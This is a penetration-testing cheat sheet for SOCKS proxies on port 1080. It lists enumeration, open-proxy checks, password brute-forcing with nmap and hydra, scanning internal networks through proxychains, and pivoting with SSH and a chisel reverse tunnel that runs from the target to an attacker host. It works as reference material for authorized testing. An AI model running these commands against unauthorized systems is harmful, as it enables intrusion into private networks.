# Port 1080 - SOCKS Proxy

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Pivoting](#pivoting)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p1080 --script "socks-auth-info" $rhost && curl -x socks5://$rhost:1080 http://ifconfig.me
```

### Nmap Scripts

```shell
nmap -sV -sC -p1080 $rhost
nmap -p1080 --script "socks-auth-info" $rhost
nmap -p1080 --script "socks-brute" $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 1080
```

### Check SOCKS Version

```shell
# SOCKS4
curl --socks4 $rhost:1080 http://ifconfig.me

# SOCKS4a
curl --socks4a $rhost:1080 http://ifconfig.me

# SOCKS5
curl --socks5 $rhost:1080 http://ifconfig.me
```

---

## Exploitation

### Test Open Proxy

```shell
# Check if proxy allows external connections
curl --socks5 $rhost:1080 http://ifconfig.me
curl --socks5 $rhost:1080 http://ipinfo.io

# Test internal network access
curl --socks5 $rhost:1080 http://192.168.1.1
curl --socks5 $rhost:1080 http://10.0.0.1
```

### Brute Force Authentication

```shell
# Nmap brute force
nmap -p1080 --script "socks-brute" \
  --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt \
  $rhost

# Hydra
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt \
  $rhost socks5
```

### Port Scanning Through Proxy

```shell
# Using proxychains
echo "socks5 $rhost 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Using nmap directly
nmap --proxies socks5://$rhost:1080 -sT -Pn 192.168.1.1
```

---

## Pivoting

### Proxychains Configuration

```shell
# /etc/proxychains4.conf
[ProxyList]
socks5 $rhost 1080
# With auth:
# socks5 $rhost 1080 username password
```

### Use with Tools

```shell
# SSH through SOCKS
proxychains ssh user@internal_host

# Web requests
proxychains curl http://internal.target

# Metasploit
setg Proxies socks5:$rhost:1080
```

### SSH Tunnel to SOCKS

```shell
# Create local SOCKS proxy via SSH
ssh -D 1080 user@$rhost

# Use with proxychains
proxychains nmap -sT -Pn target
```

### Chisel SOCKS Proxy

```shell
# Server (attacker)
chisel server -p 8080 --reverse

# Client (target)
chisel client $lhost:8080 R:socks

# Use proxy on localhost:1080
```

---

## Common SOCKS Implementations

| Software | Default Port | Notes |
| --- | --- | --- |
| SSH -D | 1080 | Dynamic port forward |
| Dante | 1080 | Enterprise proxy |
| 3proxy | 1080 | Lightweight |
| microsocks | 1080 | Minimal |
| Shadowsocks | 1080 | Encrypted proxy |

---

## Tools

- proxychains: <https://github.com/haad/proxychains>
- proxychains-ng: <https://github.com/rofl0r/proxychains-ng>
- chisel: <https://github.com/jpillora/chisel>
- reGeorg: <https://github.com/sensepost/reGeorg>

---

## References

- [HackTricks - SOCKS](https://book.hacktricks.wiki/network-services-pentesting/1080-pentesting-socks.html)
